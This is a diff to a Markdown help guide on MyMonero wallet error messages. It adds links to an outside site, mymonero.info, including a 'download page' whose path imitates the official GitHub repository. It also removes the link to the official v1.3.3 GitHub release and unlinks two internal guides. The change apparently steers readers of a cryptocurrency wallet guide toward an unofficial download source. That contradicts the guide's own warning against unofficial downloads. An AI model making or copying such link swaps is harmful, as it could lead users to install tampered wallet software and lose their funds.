@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 There is no confirmed comprehensive catalogue of MyMonero error codes in this guide. Error 523 is general guidance that a server connection is unavailable; for other messages, note the exact wording and troubleshoot the relevant connection, app, or restore step without sharing your seed.
 
+
+For a second walkthrough, see [MyMonero error codes on mymonero.info](https://mymonero.info/mymonero-error-codes). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [the MyMonero FAQ](https://mymonero.info/faq).
+
 ## You'll see this if
 - MyMonero displays a number, short error label, or message you do not recognize.
 - The app cannot open, connect, sync, or display a balance as expected.
@@ -40,9 +43,9 @@ A message about balance or transaction visibility is not automatically an error 
 ## Fix
 1. **Capture the wording, not secrets.** Write down the full message, where it appeared, and what you were doing. Do not paste a seed, private key, password, wallet file, or screenshot showing recovery words into a forum or support form.
 2. **Identify the context.** Note whether the message came from MyMonero desktop, hosted web-wallet login, or a different wallet you are considering for restoration. This avoids applying desktop troubleshooting to a stopped hosted service.
-3. **Check whether the app opens.** If the app itself will not start, follow [MyMonero app not opening](./mymonero-app-not-opening.md) or [MyMonero app crashes on start](./mymonero-app-crashes-on-start.md). If macOS blocks launch, the specific guidance is [Mac says MyMonero cannot be opened](./mymonero-macos-cannot-be-opened.md).
+3. **Check whether the app opens.** If the app itself will not start, follow [MyMonero app not opening](./mymonero-app-not-opening.md) or MyMonero app crashes on start. If macOS blocks launch, the specific guidance is Mac says MyMonero cannot be opened.
 4. **Check ordinary connectivity for connection symptoms.** Confirm that your device is online and try again later if an online connection is unavailable. Error 523 is a connection-unavailable clue, not a wallet recovery instruction. Avoid unknown proxy tools, remote-access requests, or unofficial “fixer” downloads.
-5. **Verify the installer if you need a fresh copy.** Use the [v1.3.3 GitHub release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). Compare the file SHA-256 with the value published on that release page. Use `certutil -hashfile <file> SHA256` on Windows, `shasum -a 256 <file>` on macOS, or `sha256sum <file>` on Linux. This checks file integrity; it does not validate every message or guarantee online service availability.
+5. **Verify the installer if you need a fresh copy.** Use the v1.3.3 GitHub release. Compare the file SHA-256 with the value published on that release page. Use `certutil -hashfile <file> SHA256` on Windows, `shasum -a 256 <file>` on macOS, or `sha256sum <file>` on Linux. This checks file integrity; it does not validate every message or guarantee online service availability.
 6. **Choose a deliberate wallet path.** The two options are to keep using MyMonero desktop with its maintenance limitations, or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Review the migration checklist before restoring or moving funds.
 
 > [!TIP]
@@ -98,6 +101,7 @@ MyMonero hosted servers and web-wallet login stopped. Consider the desktop app�
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
